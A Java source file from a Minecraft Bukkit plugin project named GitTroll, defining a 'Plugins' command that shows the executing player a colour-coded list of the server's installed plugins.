package net.Lenni0451.GitTroll.command.commands.server;

import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class Plugins extends CommandBase {

	public Plugins() {
		super("Plugins", "See a list of all plugins");
		
		this.addAlias("pl");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isEmpty()) {
			Plugin[] plugins = Bukkit.getPluginManager().getPlugins();
			
			String out = "";
			for(Plugin plugin : plugins) {
				boolean isGitTroll = plugin.getName().equals(GitTroll.getInstance().getName());
				if(out.isEmpty()) {
					out = (isGitTroll?"§5":"§6") + plugin.getName();
				} else {
					out += "§7, §" + (isGitTroll?"5":"6") + plugin.getName();
				}
			}
			
			executor.sendGitMessage("Plugins §e(" + plugins.length + ")§7: " + out);
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}

}
